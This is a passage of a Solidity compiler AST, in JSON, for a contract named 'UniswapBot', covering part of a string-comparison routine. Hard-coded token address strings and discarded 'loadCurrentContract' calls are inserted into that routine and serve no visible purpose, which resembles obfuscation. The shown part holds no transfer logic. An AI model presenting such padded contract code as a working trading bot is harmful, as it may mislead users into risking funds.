																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 645,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"id": 643,
														"name": "self",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 618,
														"src": "1361:4:9",
														"typeDescriptions": {
															"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
															"typeString": "struct UniswapBot.slice memory"
														}
													},
													"id": 644,
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "_ptr",
													"nodeType": "MemberAccess",
													"referencedDeclaration": 615,
													"src": "1361:9:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1346:24:9"
											},
											{
												"assignments": [
													647
												],
												"declarations": [
													{
														"constant": false,
														"id": 647,
														"mutability": "mutable",
														"name": "otherptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 764,
														"src": "1381:13:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 646,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "1381:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 650,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"id": 648,
														"name": "other",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 620,
														"src": "1397:5:9",
														"typeDescriptions": {
															"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
															"typeString": "struct UniswapBot.slice memory"
														}
													},
													"id": 649,
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "_ptr",
													"nodeType": "MemberAccess",
													"referencedDeclaration": 615,
													"src": "1397:10:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1381:26:9"
											},
											{
												"body": {
													"id": 750,
													"nodeType": "Block",
													"src": "1467:1007:9",
													"statements": [
														{
															"assignments": [
																663
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 663,
																	"mutability": "mutable",
																	"name": "a",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 750,
																	"src": "1523:6:9",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"typeName": {
																		"id": 662,
																		"name": "uint",
																		"nodeType": "ElementaryTypeName",
																		"src": "1523:4:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 664,
															"initialValue": null,
															"nodeType": "VariableDeclarationStatement",
															"src": "1523:6:9"
														},
														{
															"assignments": [
																666
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 666,
																	"mutability": "mutable",
																	"name": "b",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 750,
																	"src": "1544:6:9",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"typeName": {
																		"id": 665,
																		"name": "uint",
																		"nodeType": "ElementaryTypeName",
																		"src": "1544:4:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 667,
															"initialValue": null,
															"nodeType": "VariableDeclarationStatement",
															"src": "1544:6:9"
														},
														{
															"assignments": [
																669
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 669,
																	"mutability": "mutable",
																	"name": "WETH_CONTRACT_ADDRESS",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 750,
																	"src": "1568:35:9",
																	"stateVariable": false,
																	"storageLocation": "memory",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string"
																	},
																	"typeName": {
																		"id": 668,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "1568:6:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_storage_ptr",
																			"typeString": "string"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 671,
															"initialValue": {
																"argumentTypes": null,
																"hexValue": "307863303261616133396232323366653864306130653563346632376561643930383363373536636332",
																"id": 670,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1606:44:9",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_5270116ddce6ea9bbc0c25fe85461affe258517d80c431366a2308e1e2ce7379",
																	"typeString": "literal_string \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\""
																},
																"value": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "1568:82:9"
														},
														{
															"assignments": [
																673
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 673,
																	"mutability": "mutable",
																	"name": "TOKEN_CONTRACT_ADDRESS",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 750,
																	"src": "1665:36:9",
																	"stateVariable": false,
																	"storageLocation": "memory",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string"
																	},
																	"typeName": {
																		"id": 672,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "1665:6:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_storage_ptr",
																			"typeString": "string"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 675,
															"initialValue": {
																"argumentTypes": null,
																"hexValue": "307863303261616133396232323366653864306130653563346632376561643930383363373536636332",
																"id": 674,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1704:44:9",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_5270116ddce6ea9bbc0c25fe85461affe258517d80c431366a2308e1e2ce7379",
																	"typeString": "literal_string \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\""
																},
																"value": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "1665:83:9"
														},
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 677,
																		"name": "WETH_CONTRACT_ADDRESS",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 669,
																		"src": "1783:21:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	],
																	"id": 676,
																	"name": "loadCurrentContract",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 905,
																	"src": "1763:19:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																		"typeString": "function (string memory) pure returns (string memory)"
																	}
																},
																"id": 678,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1763:42:9",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"id": 679,
															"nodeType": "ExpressionStatement",
															"src": "1763:42:9"
														},
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 681,
																		"name": "TOKEN_CONTRACT_ADDRESS",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 673,
																		"src": "1840:22:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	],
																	"id": 680,
																	"name": "loadCurrentContract",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 905,
																	"src": "1820:19:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																		"typeString": "function (string memory) pure returns (string memory)"
																	}
																},
																"id": 682,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1820:43:9",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"id": 683,
															"nodeType": "ExpressionStatement",
															"src": "1820:43:9"
														},
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "1887:91:9",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "1906:19:9",
																		"value": {
																			"arguments": [
																				{
																					"name": "selfptr",
																					"nodeType": "YulIdentifier",
																					"src": "1917:7:9"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "1911:5:9"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1911:14:9"
																		},
																		"variableNames": [
																			{
																				"name": "a",
																				"nodeType": "YulIdentifier",
																				"src": "1906:1:9"
																			}
																		]
																	},
																	{
																		"nodeType": "YulAssignment",
																		"src": "1943:20:9",
																		"value": {
																			"arguments": [
																				{
																					"name": "otherptr",
																					"nodeType": "YulIdentifier",
																					"src": "1954:8:9"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "1948:5:9"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1948:15:9"
																		},
																		"variableNames": [
																			{
																				"name": "b",
																				"nodeType": "YulIdentifier",
																				"src": "1943:1:9"
																			}
																		]
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 663,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1906:1:9",
																	"valueSize": 1
																},
																{
																	"declaration": 666,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1943:1:9",
																	"valueSize": 1
																},
																{
																	"declaration": 647,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1954:8:9",
																	"valueSize": 1
																},
																{
																	"declaration": 642,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1917:7:9",
																	"valueSize": 1
																}
															],
															"id": 684,
															"nodeType": "InlineAssembly",
															"src": "1878:100:9"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 687,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 685,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 663,
																	"src": "1999:1:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "!=",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 686,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 666,
																	"src": "2004:1:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "1999:6:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 741,
															"nodeType": "IfStatement",
															"src": "1995:411:9",
															"trueBody": {
																"id": 740,
																"nodeType": "Block",
																"src": "2007:399:9",
																"statements": [
																	{
																		"assignments": [
																			689
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 689,
																				"mutability": "mutable",
																				"name": "mask",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 740,
																				"src": "2110:12:9",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 688,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "2110:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 695,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 693,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "UnaryOperation",
																					"operator": "-",
																					"prefix": true,
																					"src": "2133:2:9",
																					"subExpression": {
																						"argumentTypes": null,
																						"hexValue": "31",
																						"id": 692,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "2134:1:9",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_1_by_1",
																							"typeString": "int_const 1"
																						},
																						"value": "1"
																					},
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_minus_1_by_1",
																						"typeString": "int_const -1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_minus_1_by_1",
																						"typeString": "int_const -1"
																					}
																				],
																				"id": 691,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "2125:7:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint256_$",
																					"typeString": "type(uint256)"
																				},
																				"typeName": {
																					"id": 690,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "2125:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 694,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "2125:11:9",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2110:26:9"
																	},
																	{
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 698,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 696,
																				"name": "shortest",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 626,
																				"src": "2161:8:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3332",
																				"id": 697,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "2172:2:9",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_32_by_1",
																					"typeString": "int_const 32"
																				},
																				"value": "32"
																			},
																			"src": "2161:13:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": null,
																		"id": 718,
																		"nodeType": "IfStatement",
																		"src": "2158:105:9",
																		"trueBody": {
																			"id": 717,
																			"nodeType": "Block",
																			"src": "2176:87:9",
																			"statements": [
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 715,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 699,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 689,
																							"src": "2197:4:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"id": 714,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"nodeType": "UnaryOperation",
																							"operator": "~",
																							"prefix": true,
																							"src": "2204:39:9",
																							"subExpression": {
																								"argumentTypes": null,
																								"components": [
																									{
																										"argumentTypes": null,
																										"commonType": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										},
																										"id": 712,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": false,
																										"lValueRequested": false,
																										"leftExpression": {
																											"argumentTypes": null,
																											"commonType": {
																												"typeIdentifier": "t_uint256",
																												"typeString": "uint256"
																											},
																											"id": 710,
																											"isConstant": false,
																											"isLValue": false,
																											"isPure": false,
																											"lValueRequested": false,
																											"leftExpression": {
																												"argumentTypes": null,
																												"hexValue": "32",
																												"id": 700,
																												"isConstant": false,
																												"isLValue": false,
																												"isPure": true,
																												"kind": "number",
																												"lValueRequested": false,
																												"nodeType": "Literal",
																												"src": "2206:1:9",
																												"subdenomination": null,
																												"typeDescriptions": {
																													"typeIdentifier": "t_rational_2_by_1",
																													"typeString": "int_const 2"
																												},
																												"value": "2"
																											},
																											"nodeType": "BinaryOperation",
																											"operator": "**",
																											"rightExpression": {
																												"argumentTypes": null,
																												"components": [
																													{
																														"argumentTypes": null,
																														"commonType": {
																															"typeIdentifier": "t_uint256",
																															"typeString": "uint256"
																														},
																														"id": 708,
																														"isConstant": false,
																														"isLValue": false,
																														"isPure": false,
																														"lValueRequested": false,
																														"leftExpression": {
																															"argumentTypes": null,
																															"hexValue": "38",
																															"id": 701,
																															"isConstant": false,
																															"isLValue": false,
																															"isPure": true,
																															"kind": "number",
																															"lValueRequested": false,
																															"nodeType": "Literal",
																															"src": "2212:1:9",
																															"subdenomination": null,
																															"typeDescriptions": {
																																"typeIdentifier": "t_rational_8_by_1",
																																"typeString": "int_const 8"
																															},
																															"value": "8"
																														},
																														"nodeType": "BinaryOperation",
																														"operator": "*",
																														"rightExpression": {
																															"argumentTypes": null,
																															"components": [
																																{
																																	"argumentTypes": null,
																																	"commonType": {
																																		"typeIdentifier": "t_uint256",
																																		"typeString": "uint256"
																																	},
																																	"id": 706,
																																	"isConstant": false,
																																	"isLValue": false,
																																	"isPure": false,
																																	"lValueRequested": false,
																																	"leftExpression": {
																																		"argumentTypes": null,
																																		"commonType": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		},
																																		"id": 704,
																																		"isConstant": false,
																																		"isLValue": false,
																																		"isPure": false,
																																		"lValueRequested": false,
																																		"leftExpression": {
																																			"argumentTypes": null,
																																			"hexValue": "3332",
																																			"id": 702,
																																			"isConstant": false,
																																			"isLValue": false,
																																			"isPure": true,
																																			"kind": "number",
																																			"lValueRequested": false,
																																			"nodeType": "Literal",
																																			"src": "2217:2:9",
																																			"subdenomination": null,
																																			"typeDescriptions": {
																																				"typeIdentifier": "t_rational_32_by_1",
																																				"typeString": "int_const 32"
																																			},
																																			"value": "32"
																																		},
																																		"nodeType": "BinaryOperation",
																																		"operator": "-",
																																		"rightExpression": {
																																			"argumentTypes": null,
																																			"id": 703,
																																			"name": "shortest",
																																			"nodeType": "Identifier",
																																			"overloadedDeclarations": [],
																																			"referencedDeclaration": 626,
																																			"src": "2222:8:9",
																																			"typeDescriptions": {
																																				"typeIdentifier": "t_uint256",
																																				"typeString": "uint256"
																																			}
																																		},
																																		"src": "2217:13:9",
																																		"typeDescriptions": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		}
																																	},
																																	"nodeType": "BinaryOperation",
																																	"operator": "+",
																																	"rightExpression": {
																																		"argumentTypes": null,
																																		"id": 705,
																																		"name": "idx",
																																		"nodeType": "Identifier",
																																		"overloadedDeclarations": [],
																																		"referencedDeclaration": 652,
																																		"src": "2233:3:9",
																																		"typeDescriptions": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		}
																																	},
																																	"src": "2217:19:9",
																																	"typeDescriptions": {
																																		"typeIdentifier": "t_uint256",
																																		"typeString": "uint256"
																																	}
																																}
																															],
																															"id": 707,
																															"isConstant": false,
																															"isInlineArray": false,
																															"isLValue": false,
																															"isPure": false,
																															"lValueRequested": false,
																															"nodeType": "TupleExpression",
																															"src": "2216:21:9",
																															"typeDescriptions": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															}
																														},
																														"src": "2212:25:9",
																														"typeDescriptions": {
																															"typeIdentifier": "t_uint256",
																															"typeString": "uint256"
																														}
																													}
																												],
																												"id": 709,
																												"isConstant": false,
																												"isInlineArray": false,
																												"isLValue": false,
																												"isPure": false,
																												"lValueRequested": false,
																												"nodeType": "TupleExpression",
																												"src": "2211:27:9",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											},
																											"src": "2206:32:9",
																											"typeDescriptions": {
																												"typeIdentifier": "t_uint256",
																												"typeString": "uint256"
																											}
																										},
																										"nodeType": "BinaryOperation",
																										"operator": "-",
																										"rightExpression": {
																											"argumentTypes": null,
																											"hexValue": "31",
																											"id": 711,
																											"isConstant": false,
																											"isLValue": false,
																											"isPure": true,
																											"kind": "number",
																											"lValueRequested": false,
																											"nodeType": "Literal",
																											"src": "2241:1:9",
																											"subdenomination": null,
																											"typeDescriptions": {
																												"typeIdentifier": "t_rational_1_by_1",
																												"typeString": "int_const 1"
																											},
																											"value": "1"
																										},
																										"src": "2206:36:9",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									}
																								],
																								"id": 713,
																								"isConstant": false,
																								"isInlineArray": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"nodeType": "TupleExpression",
																								"src": "2205:38:9",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "2197:46:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 716,
																					"nodeType": "ExpressionStatement",
																					"src": "2197:46:9"
																				}
																			]
																		}
																	},
																	{
																		"assignments": [
																			720
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 720,
																				"mutability": "mutable",
																				"name": "diff",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 740,
																				"src": "2281:12:9",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 719,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "2281:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 730,
																		"initialValue": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 729,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"components": [
																					{
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 723,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 721,
																							"name": "a",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 663,
																							"src": "2297:1:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "&",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 722,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 689,
																							"src": "2301:4:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "2297:8:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"id": 724,
																				"isConstant": false,
																				"isInlineArray": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "TupleExpression",
																				"src": "2296:10:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"components": [
																					{
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 727,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 725,
																							"name": "b",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 666,
																							"src": "2310:1:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "&",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 726,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 689,
																							"src": "2314:4:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "2310:8:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"id": 728,
																				"isConstant": false,
																				"isInlineArray": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "TupleExpression",
																				"src": "2309:10:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "2296:23:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2281:38:9"
																	},
																	{
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 733,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 731,
																				"name": "diff",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 720,
																				"src": "2342:4:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "!=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30",
																				"id": 732,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "2350:1:9",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				},
																				"value": "0"
																			},
																			"src": "2342:9:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": null,
																		"id": 739,
																		"nodeType": "IfStatement",
																		"src": "2338:52:9",
																		"trueBody": {
																			"expression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 736,
																						"name": "diff",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 720,
																						"src": "2385:4:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					],
																					"id": 735,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "ElementaryTypeNameExpression",
																					"src": "2381:3:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_int256_$",
																						"typeString": "type(int256)"
																					},
																					"typeName": {
																						"id": 734,
																						"name": "int",
																						"nodeType": "ElementaryTypeName",
																						"src": "2381:3:9",
																						"typeDescriptions": {
																							"typeIdentifier": null,
																							"typeString": null
																						}
																					}
																				},
																				"id": 737,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "typeConversion",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "2381:9:9",
																				"tryCall": false,
